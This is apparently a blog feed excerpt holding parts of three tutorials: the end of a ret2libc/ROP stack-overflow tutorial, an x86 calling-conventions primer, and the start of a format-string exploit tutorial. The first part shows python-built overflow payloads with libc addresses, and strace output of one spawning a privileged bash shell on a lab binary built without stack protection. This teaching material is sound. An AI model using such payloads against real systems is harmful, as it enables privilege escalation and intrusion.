&lt;span class="go"&gt;0xffffd6ec: 0x5564b6f0 &amp;lt;execlp&amp;gt; 0x80483fa &amp;lt;main&amp;gt;    0x80483fa &amp;lt;main&amp;gt;    0x0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;&lt;code&gt;strace&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;Another really useful tool is &lt;code&gt;strace&lt;/code&gt;, which will print out every syscall made by the program. In the following example, I forgot to set &lt;code&gt;PATH&lt;/code&gt;: the exploit worked but it was unable to find my file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat &amp;lt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*0x6c + &amp;quot;BBBB&amp;quot; + &amp;quot;\xf0\xb6\x64\x55&amp;quot; + &amp;quot;\xfa\x83\x04\x08&amp;quot;*2 + &amp;quot;\x00\x00\x00\x00&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; strace ./a.out
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;read(0, &amp;quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot;..., 200) = 129&lt;/span&gt;
&lt;span class="go"&gt;execve(&amp;quot;/usr/local/sbin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
&lt;span class="go"&gt;execve(&amp;quot;/usr/local/bin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
&lt;span class="go"&gt;execve(&amp;quot;/usr/sbin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
&lt;span class="go"&gt;execve(&amp;quot;/usr/bin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
&lt;span class="go"&gt;execve(&amp;quot;/sbin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
&lt;span class="go"&gt;execve(&amp;quot;/bin/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)&lt;/span&gt;
&lt;span class="go"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In this case, I forgot to keep &lt;code&gt;stdin&lt;/code&gt; open, so it happily executes my &lt;code&gt;python&lt;/code&gt; program and &lt;code&gt;bash&lt;/code&gt; and then immediately &lt;code&gt;exit&lt;/code&gt;s after a 0 byte &lt;code&gt;read&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python -c &lt;span class="s1"&gt;&amp;#39;print &amp;quot;A&amp;quot;*0x6c + &amp;quot;BBBB&amp;quot; + &amp;quot;\xf0\xb6\x64\x55&amp;quot; + &amp;quot;\xfa\x83\x04\x08&amp;quot;*2 + &amp;quot;\x00\x00\x00\x00&amp;quot;&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; strace ./a.out
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;read(0, &amp;quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot;..., 200) = 129&lt;/span&gt;
&lt;span class="go"&gt;execve(&amp;quot;/tmp/U\211\345\203\344\360\350\317\377\377\377\270&amp;quot;, [], [/* 30 vars */]) = 0&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;geteuid()                               = 1337&lt;/span&gt;
&lt;span class="go"&gt;geteuid()                               = 1337&lt;/span&gt;
&lt;span class="go"&gt;geteuid()                               = 1337&lt;/span&gt;
&lt;span class="go"&gt;setresuid(1337, 1337, 1337)             = 0&lt;/span&gt;
&lt;span class="go"&gt;execve(&amp;quot;/bin/bash&amp;quot;, [&amp;quot;bash&amp;quot;], [/* 21 vars */]) = 0&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;read(0, &amp;quot;&amp;quot;, 1)                          = 0&lt;/span&gt;
&lt;span class="go"&gt;exit_group(0)                           = ?&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-1"&gt;
&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/ASLR"&gt;ASLR&lt;/a&gt; is the technique where portions of the program, such as the stack or the heap, are placed at a random location in memory when the program is first run. This causes the address of stack buffers, allocated objects, etc to be randomized between runs of the program and prevents the attacker.&amp;#160;&lt;a class="footnote-backref" href="#fnref-1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-2"&gt;
&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/Data_Execution_Prevention"&gt;DEP&lt;/a&gt; is the technique where memory can be either writable or executable, but not both. This prevents an attacker from filling a buffer with shellcode and executing it. While this usually requires hardware support, it is quite commonly used on modern programs. &amp;#160;&lt;a class="footnote-backref" href="#fnref-2" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-3"&gt;
&lt;p&gt;To make life easier for us, we compile with &lt;code&gt;gcc -m32 -fno-stack-protector easy_rop.c&lt;/code&gt;. &amp;#160;&lt;a class="footnote-backref" href="#fnref-3" title="Jump back to footnote 3 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-4"&gt;
&lt;p&gt;You'll note that we use print the exploit string in a python subshell.  This is so we can print escape characters and use arbitrary bytes in our payload. We also surround the subshell in double quotes in case the payload had whitespace in it.&amp;#160;&lt;a class="footnote-backref" href="#fnref-4" title="Jump back to footnote 4 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-7"&gt;
&lt;p&gt;These can be found in the &lt;code&gt;libc&lt;/code&gt; library itself: &lt;code&gt;ldd a.out&lt;/code&gt; tells us that the library can be found at &lt;code&gt;/lib/i386-linux-gnu/libc.so.6&lt;/code&gt;. We can use &lt;code&gt;objdump&lt;/code&gt;, &lt;code&gt;nm&lt;/code&gt;, &lt;code&gt;strings&lt;/code&gt;, etc. on this library to directly find any information we need. These addresses will all be offset from the base of &lt;code&gt;libc&lt;/code&gt; in memory and can be used to compute the actual addresses by adding the offset of &lt;code&gt;libc&lt;/code&gt; in memory.&amp;#160;&lt;a class="footnote-backref" href="#fnref-7" title="Jump back to footnote 5 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-8"&gt;
&lt;p&gt;I believe someone even &lt;a href="http://cseweb.ucsd.edu/~hovav/papers/rbss12.html"&gt;tried to prove&lt;/a&gt; that ROP is turing complete.   &amp;#160;&lt;a class="footnote-backref" href="#fnref-8" title="Jump back to footnote 6 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-10"&gt;
&lt;p&gt;Note the &lt;code&gt;$'\211'&lt;/code&gt; syntax to enter escape characters.&amp;#160;&lt;a class="footnote-backref" href="#fnref-10" title="Jump back to footnote 7 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-11"&gt;
&lt;p&gt;To see why this is necessary, compare the behavior of &lt;code&gt;echo ls | bash&lt;/code&gt; to &lt;code&gt;cat &amp;lt;(echo ls) - | bash&lt;/code&gt;.&amp;#160;&lt;a class="footnote-backref" href="#fnref-11" title="Jump back to footnote 8 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="exploitation"></category><category term="tutorial"></category></entry><entry><title>A brief introduction to x86 calling conventions</title><link href="http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html" rel="alternate"></link><published>2013-05-21T00:00:00-07:00</published><updated>2013-05-21T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-21:/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html</id><summary type="html">&lt;p&gt;To support some of my other tutorials, I prepared a brief introduction to x86 calling conventions.&lt;/p&gt;</summary><content type="html">&lt;p&gt;To support some of my other tutorials, I will provide a brief introduction to x86 calling conventions. This should be considered an &lt;em&gt;introduction&lt;/em&gt;, not a thorough resource. I encourage you to check out the "Machine Prog" lectures from &lt;a href="https://www.cs.cmu.edu/afs/cs/academic/class/15213-s13/www/schedule.html"&gt;the CMU 15-213 course&lt;/a&gt; or an alternative resource. In particular, pages 11-14 of &lt;a href="https://www.cs.cmu.edu/afs/cs/academic/class/15213-s13/www/lectures/07-machine-procedures.pdf"&gt;this lecture&lt;/a&gt; are useful. &lt;a href="https://en.wikipedia.org/wiki/X86_calling_conventions"&gt;The wikipedia page&lt;/a&gt; is also a useful reference.&lt;/p&gt;
&lt;h1&gt;Calling a function&lt;/h1&gt;
&lt;p&gt;A computer program&lt;sup id="fnref-3"&gt;&lt;a class="footnote-ref" href="#fn-3"&gt;1&lt;/a&gt;&lt;/sup&gt; keeps track of two important pointers as it runs: the instruction pointer, which points to the next instruction it will execute, and the stack pointer, which points to the last value pushed onto the stack. In x86, the instruction pointer is the register &lt;code&gt;%eip&lt;/code&gt; and the stack pointer is in the register &lt;code&gt;%esp&lt;/code&gt;&lt;sup id="fnref-4"&gt;&lt;a class="footnote-ref" href="#fn-4"&gt;2&lt;/a&gt;&lt;/sup&gt;. The stack grows down (as values are pushed onto the stack, the stack pointer decreases) and is logically divided into regions, one for each function, called stack frames. &lt;/p&gt;
&lt;p&gt;When a function is called, the instruction pointer is pushed onto the stack to allow the program to return to the site of the &lt;code&gt;call&lt;/code&gt; later. Before the &lt;code&gt;call&lt;/code&gt;, the instruction pointer points to the &lt;code&gt;call&lt;/code&gt; instruction and the stack pointer points to the last thing pushed (in this case, some garbage value):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                    code                          |          stack
--------------------------------------------------+----------------------------
%eip =&amp;gt; 0x00001f66: call   0x1ef0 &amp;lt;nop_ret&amp;gt;       |      | 0xdeadbeef | &amp;lt;= %esp
        0x00001f6b: movl   $0x0,-0x8(%ebp)        |      |            |
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After the &lt;code&gt;call&lt;/code&gt;, the instruction pointer points to the first instruction in our function and the stack pointer points to the last thing pushed, the return address from our function:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                    code                          |          stack
--------------------------------------------------+----------------------------
%eip =&amp;gt; 0x00001ef0: ret                           |      | 0xdeadbeef |
                                                  |      | 0x00001f6b | &amp;lt;= %esp
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In this case, the function does nothing and merely returns. The &lt;code&gt;ret&lt;/code&gt; instruction pops a value off the stack and into &lt;code&gt;%eip&lt;/code&gt;. This both increments the stack pointer and returns control flow to the calling function:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                    code                          |          stack
--------------------------------------------------+----------------------------
        0x00001f66: call   0x1ef0 &amp;lt;nop_ret&amp;gt;       |      | 0xdeadbeef | &amp;lt;= %esp
%eip =&amp;gt; 0x00001f6b: movl   $0x0,-0x8(%ebp)        |      |            |
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Arguments&lt;/h1&gt;
&lt;p&gt;When a function needing arguments is called, they pushed onto the stack immediately before the call&lt;sup id="fnref-5"&gt;&lt;a class="footnote-ref" href="#fn-5"&gt;3&lt;/a&gt;&lt;/sup&gt;. If there is more than one argument, the first argument is pushed on last. The following sequence of operations corresponds to the function call &lt;code&gt;proj_1(0x5, 0x10)&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                    code                          |          stack
--------------------------------------------------+----------------------------
%eip =&amp;gt; 0x00001f78: pushl  $0x10                  |      | 0xdeadbeef | &amp;lt;= %esp
        0x00001f7a: pushl  $0x5                   |      |            |
        0x00001f7c: call   0x1f90 &amp;lt;proj_1&amp;gt;        |      |            |
        0x00001f81: addl   $0x8, %esp             |      |            |      
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;        0x00001f78: pushl  $0x10                  |      | 0xdeadbeef |
%eip =&amp;gt; 0x00001f7a: pushl  $0x5                   |      | 0x10       | &amp;lt;= %esp
        0x00001f7c: call   0x1f90 &amp;lt;proj_1&amp;gt;        |      |            |
        0x00001f81: addl   $0x8, %esp             |      |            |      
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;        0x00001f78: pushl  $0x10                  |      | 0xdeadbeef |
        0x00001f7a: pushl  $0x5                   |      | 0x10       |
%eip =&amp;gt; 0x00001f7c: call   0x1f90 &amp;lt;proj_1&amp;gt;        |      | 0x5        | &amp;lt;= %esp
        0x00001f81: addl   $0x8, %esp             |      |            |      
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It is more common to see arguments put onto the stack via &lt;code&gt;mov&lt;/code&gt; instructions rather than via &lt;code&gt;push&lt;/code&gt; instructions. The following block of code also would call &lt;code&gt;proj_1(0x5, 0x10)&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;subl&lt;/span&gt; &lt;span class="no"&gt;$0x8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;      &lt;span class="c"&gt;# Reserve space for the arguments (4 bytes for each arg).&lt;/span&gt;
&lt;span class="nf"&gt;movl&lt;/span&gt; &lt;span class="no"&gt;$0x10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;%esp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c"&gt;# Put the first argument at the memory address %esp + 4.&lt;/span&gt;
&lt;span class="nf"&gt;movl&lt;/span&gt; &lt;span class="no"&gt;$0x5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;%esp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;    &lt;span class="c"&gt;# Put the second argument at the memory address %esp&lt;/span&gt;
&lt;span class="nf"&gt;call&lt;/span&gt; &lt;span class="no"&gt;proj_1&lt;/span&gt;
&lt;span class="nf"&gt;addl&lt;/span&gt; &lt;span class="no"&gt;$0x8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;      &lt;span class="c"&gt;# Reclaim stack space reserved for arguments.&lt;/span&gt;
&lt;span class="nf"&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Return values&lt;/h1&gt;
&lt;p&gt;As you can see, the arguments are above the return address on the stack immediately after the function call. In this case, our simple function returns merely the first argument. The &lt;code&gt;mov 0x4(%esp), %eax&lt;/code&gt; moves the value 4 above &lt;code&gt;%esp&lt;/code&gt; into &lt;code&gt;%eax&lt;/code&gt;. By convention, the return value of a function is in &lt;code&gt;%eax&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                    code                          |          stack
--------------------------------------------------+----------------------------
%eip =&amp;gt; 0x00001f90: mov    0x4(%esp),%eax         |      | 0xdeadbeef | 
        0x00001f94: ret                           |      | 0x10       |
                                                  |      | 0x5        |
                                                  |      | 0x00001f81 | &amp;lt;= %esp
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;        0x00001f90: mov    0x4(%esp),%eax         |      | 0xdeadbeef | 
%eip =&amp;gt; 0x00001f94: ret                           |      | 0x10       |
                                                  |      | 0x5        |
                                                  |      | 0x00001f81 | &amp;lt;= %esp
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;        0x00001f78: pushl  $0x10                  |      | 0xdeadbeef |
        0x00001f7a: pushl  $0x5                   |      | 0x10       |
        0x00001f7c: call   0x1f90 &amp;lt;proj_1&amp;gt;        |      | 0x5        | &amp;lt;= %esp
%eip =&amp;gt; 0x00001f81: addl   $0x8, %esp             |      |            |      
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Immediately after the function call, the &lt;code&gt;addl $0x8, %esp&lt;/code&gt; reclaims the stack space used by pushing the arguments (in this case, 4 bytes for each of the two arguments).&lt;/p&gt;
&lt;h1&gt;Base pointer and local variables&lt;/h1&gt;
&lt;p&gt;The base pointer is conventionally used to mark the start of a function's stack frame, or the area of the stack managed by that function. Local variables are stored below the base pointer and above the stack pointer. The start of each function has a preamble saves the old base pointer and initializes a new one and the end of each function has epilogue that restores the old base pointer:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;my_function:&lt;/span&gt;
  &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;              &lt;span class="c"&gt;# Preamble: save the old %ebp.&lt;/span&gt;
  &lt;span class="nf"&gt;movl&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;        &lt;span class="c"&gt;# Point %ebp to the saved %ebp and the new stack frame.&lt;/span&gt;

  &lt;span class="nf"&gt;subl&lt;/span&gt; &lt;span class="no"&gt;$0x4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;        &lt;span class="c"&gt;# Reserve space for local variables.&lt;/span&gt;

  &lt;span class="nf"&gt;movl&lt;/span&gt; &lt;span class="mi"&gt;0x8&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;%ebp&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nv"&gt;%eax&lt;/span&gt;   
  &lt;span class="no"&gt;movl&lt;/span&gt; &lt;span class="nv"&gt;%eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;%ebp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c"&gt;# Move argument into local variable.&lt;/span&gt;

  &lt;span class="c"&gt;# Function body. &lt;/span&gt;

  &lt;span class="nf"&gt;addl&lt;/span&gt; &lt;span class="no"&gt;$0x4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;        &lt;span class="c"&gt;# Reclaim space used by local variables.&lt;/span&gt;

  &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;               &lt;span class="c"&gt;# Epilogue: restore the old %ebp.&lt;/span&gt;
  &lt;span class="nf"&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Inside a function, the stack would look like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;argument 2&amp;gt;       |
| &amp;lt;argument 1&amp;gt;       |
| &amp;lt;return address&amp;gt;   |
| &amp;lt;old ebp&amp;gt;          | &amp;lt;= %ebp
| &amp;lt;local var 1&amp;gt;      |
| &amp;lt;local var 2&amp;gt;      | &amp;lt;= %esp
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Saving registers&lt;/h1&gt;
&lt;p&gt;Inside a function, you can freely use &lt;code&gt;%eax&lt;/code&gt;, &lt;code&gt;%ecx&lt;/code&gt;, and &lt;code&gt;%edx&lt;/code&gt;. However, they are not guaranteed to be persistent across function calls (other functions can use them freely) so you must save them before calling other functions. If you use any other register, you &lt;em&gt;must&lt;/em&gt; make sure to save them before you use them and restore them to the original values before you return. Registers you must save before you call a function are called &lt;em&gt;caller save&lt;/em&gt; registers. Registers you must save before you can use them in a function are called &lt;em&gt;callee save&lt;/em&gt; registers. The following block of code demonstrates the proper way to save &lt;code&gt;%ebx&lt;/code&gt; (callee save) and &lt;code&gt;%ecx&lt;/code&gt; (caller save):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;my_function:&lt;/span&gt;
  &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;              &lt;span class="c"&gt;# Preamble: save the old %ebp.&lt;/span&gt;
  &lt;span class="nf"&gt;movl&lt;/span&gt; &lt;span class="nv"&gt;%esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;
  &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nv"&gt;%ebx&lt;/span&gt;              &lt;span class="c"&gt;# Save %ebx before we use it.&lt;/span&gt;

  &lt;span class="c"&gt;# Function body.&lt;/span&gt;

  &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nv"&gt;%ecx&lt;/span&gt;              &lt;span class="c"&gt;# Save %ecx before a function call.  &lt;/span&gt;
  &lt;span class="nf"&gt;call&lt;/span&gt; &lt;span class="no"&gt;another_function&lt;/span&gt;
  &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%ecx&lt;/span&gt;               &lt;span class="c"&gt;# Restore %ecx after a function call.&lt;/span&gt;

  &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%ebx&lt;/span&gt;               &lt;span class="c"&gt;# Restore %ebx before we return.&lt;/span&gt;
  &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nv"&gt;%ebp&lt;/span&gt;               &lt;span class="c"&gt;# Epilogue: restore the old %ebp.&lt;/span&gt;
  &lt;span class="nf"&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;To recap:&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;%esp&lt;/code&gt; points to the last thing pushed on the stack.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%eip&lt;/code&gt; points to the next thing to execute.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;call &amp;lt;addr&amp;gt;&lt;/code&gt; pushes the current value of &lt;code&gt;%eip&lt;/code&gt; and changes &lt;code&gt;%eip&lt;/code&gt; to &lt;code&gt;&amp;lt;addr&amp;gt;&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ret&lt;/code&gt; pops the next value off the stack into &lt;code&gt;%eip&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Arguments are pushed onto the stack before a function call.&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Immediately after function call, the stack looks like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;argument 2&amp;gt;     |
| &amp;lt;argument 1&amp;gt;     |
| &amp;lt;return address&amp;gt; | &amp;lt;= %esp
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Inside a function, the stack looks like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;| &amp;lt;argument 2&amp;gt;       |
| &amp;lt;argument 1&amp;gt;       |
| &amp;lt;return address&amp;gt;   |
| &amp;lt;old %ebp&amp;gt;         | &amp;lt;= %ebp
| &amp;lt;local var 1&amp;gt;      |
| &amp;lt;local var 2&amp;gt;      | &amp;lt;= %esp
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The return value of a function is in &lt;code&gt;%eax&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%eax&lt;/code&gt;, &lt;code&gt;%ecx&lt;/code&gt;, and &lt;code&gt;%edx&lt;/code&gt; are caller save registers. &lt;code&gt;%ebp&lt;/code&gt;, &lt;code&gt;%ebx&lt;/code&gt;, &lt;code&gt;%edi&lt;/code&gt;, and &lt;code&gt;%esi&lt;/code&gt; are callee save registers.&lt;/li&gt;
&lt;li&gt;Please read more to learn more!&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-3"&gt;
&lt;p&gt;While I hope to stay close the spirit of the truth, I'm about to lie to simplify things. Please forgive me.&amp;#160;&lt;a class="footnote-backref" href="#fnref-3" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-4"&gt;
&lt;p&gt;In x86-64, the instruction pointer and the stack pointer are in the registers &lt;code&gt;%rip&lt;/code&gt; and &lt;code&gt;%rsp&lt;/code&gt;, respectively.&amp;#160;&lt;a class="footnote-backref" href="#fnref-4" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-5"&gt;
&lt;p&gt;In x86-64, the first 6 integer arguments are passed in the registers &lt;code&gt;%rdi&lt;/code&gt;, &lt;code&gt;%rsi&lt;/code&gt;, &lt;code&gt;%rdx&lt;/code&gt;, &lt;code&gt;%rcx&lt;/code&gt;, &lt;code&gt;%r9&lt;/code&gt;, and &lt;code&gt;%r8&lt;/code&gt;. The first 8 floating point arguments are passed in via &lt;code&gt;%xmm0&lt;/code&gt; through &lt;code&gt;%xmm7&lt;/code&gt;. Any additional arguments are pushed onto the stack.&amp;#160;&lt;a class="footnote-backref" href="#fnref-5" title="Jump back to footnote 3 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="tutorial"></category></entry><entry><title>Introduction to format string exploits</title><link href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html" rel="alternate"></link><published>2013-05-02T00:00:00-07:00</published><updated>2013-05-02T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-02:/posts/2013/05/02/introduction-to-format-string-exploits.html</id><summary type="html">&lt;p&gt;A brief introduction to format string exploits.&lt;/p&gt;</summary><content type="html">&lt;p&gt;It would be helpful to be familiar with the x86 calling conventions before reading this tutorial. I prepared a brief primer &lt;a href="http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html"&gt;here&lt;/a&gt; and you are encouraged to learn more on your own.&lt;/p&gt;
&lt;h1&gt;How do format strings vulnerabilities work?&lt;/h1&gt;
&lt;p&gt;Format string vulnerabilities are a pretty silly class of bug that take advantage of an easily avoidable programmer error.
If the programmer passes an attacker-controlled buffer as the argument to a &lt;code&gt;printf&lt;/code&gt; 
(or any of the related functions, including &lt;code&gt;sprintf&lt;/code&gt;, &lt;code&gt;fprintf&lt;/code&gt;, etc), the attacker can perform
writes to arbitrary memory addresses. The following program contains such an error:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt;&lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
